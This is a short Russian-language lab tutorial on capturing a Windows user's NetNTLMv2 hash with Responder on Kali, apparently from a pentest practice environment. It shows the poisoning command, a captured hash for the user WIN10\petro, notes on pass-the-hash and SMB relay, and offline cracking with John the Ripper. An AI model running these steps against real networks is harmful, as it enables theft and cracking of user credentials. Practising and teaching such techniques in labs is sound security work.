# Responder 

## Получение NTLMv2-хеша
На Kali выполнить команду:

`sudo responder -I eth0`

На ОС Windows открыть explorer и обратиться к недоступной машине:

`\\linux3114`

Responder показывает вот такой вывод:

`[SMB] NTLMv2-SSP Client   : 192.168.100.129`
`[SMB] NTLMv2-SSP Username : WIN10\petro`
`[SMB] NTLMv2-SSP Hash     : petro::WIN10:4f834a1db802ec6c:B9C5212CE053CB772905F294376C73F2:0101000000000000C0653150DE09D201F1D69AE5341C6E74000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D20106000400020000000800300030000000000000000000000000200000993A94B50FE9117E1B81C3A808C9A7CD44B0B7E1420056E32DD9B490327342610A0010000000000000000000000000000000000009001C0063006900660073002F006C0069006E007500780030003000300031000000000000000000`

Сохраненный вывод так же можно посмотреть в лог-файле. Для Kali это _/usr/share/responder_

Отличие NTLM и NetNTLMv2 хешей:
- NTLM-хеш (или NT-хеш) - это MD4-хеш пароля без соли, который используется Windows для хранения паролей в файле SAM (локальные пользователи) или в файле NTDS.dit (пользователи домена). 
Этот тип хеша можно использовать в атаке Pass-the-Hash.

- Хеш NetNTLMv2 - это хеш из запроса-ответа, который можно использовать для автономной (offline) атаки методом грубой силы. 
Этот тип хэша не может использоваться в атаке Pass-the-Hash, но потенциально может быть ретранслирован в атаке Relaying SMB.

## Brute 

`john --format=netntlmv2 ./SMB-NTLMv2-SSP-192.168.100.129.txt`

Просмотреть ранее подобранные хеши:

`john --show --format=netntlmv2 ./SMB-NTLMv2-SSP-192.168.100.129.txt`
